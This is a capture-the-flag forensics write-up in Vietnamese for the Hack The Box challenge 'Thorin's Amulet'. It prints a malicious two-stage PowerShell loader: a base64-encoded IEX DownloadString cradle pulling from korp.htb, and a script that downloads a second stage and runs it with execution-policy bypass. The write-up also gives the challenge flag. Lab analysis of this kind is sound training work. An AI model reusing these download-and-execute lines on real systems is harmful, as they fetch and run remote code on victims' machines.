# _Thorin’s Amulet_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/1f8fd6b4-c229-4ca2-aa4e-ce5120d5db9e)

Nhận được file ps1

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

Decode base64 nhận được 1 đường link, thử truy dùng port để truy cập nhưng kh đc

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Đọc kĩ lại mô tả thì thấy có NOTE

> Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

Mình dùng kali để add IP và domain vào /etc/host/

![image](https://github.com/user-attachments/assets/639b3022-3acc-40ac-be10-345154933c52)

Truy cập thử, thì nhận được file ps1 tiếp

```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Lệnh trên thực hiện tải file ps1 và chạy với lệnh Bypass, muốn xem file có gì thì mình dùng curl kết hợp với KEY xác thực

![image](https://github.com/user-attachments/assets/f404de2a-bac1-4d15-a224-45825120d93a)

Decode là nhận được flag

```
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```
